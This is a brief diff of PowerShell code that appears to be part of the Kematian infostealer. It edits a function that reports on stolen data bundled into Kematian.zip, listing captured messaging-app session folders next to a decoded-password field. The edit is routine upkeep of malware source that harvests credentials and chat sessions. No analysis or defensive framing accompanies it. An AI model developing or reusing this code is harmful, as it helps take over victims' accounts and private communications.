@@ -880,7 +880,7 @@ Pass: $decodedPass
     # Send info about the data in the Kematian.zip
     function kematianinfo {	
         $messaging_sessions_info = if (Test-Path $folder_messaging) {
-            $messaging_sessions_content = Get-ChildItem -Path $folder_messaging | ForEach-Object { $_.Name -replace '\..+$' }
+            $messaging_sessions_content = Get-ChildItem -Path $folder_messaging -Directory | ForEach-Object { $_.Name -replace '\..+$' }
             if ($messaging_sessions_content) {
                 $messaging_sessions_content -join ' | '
             }
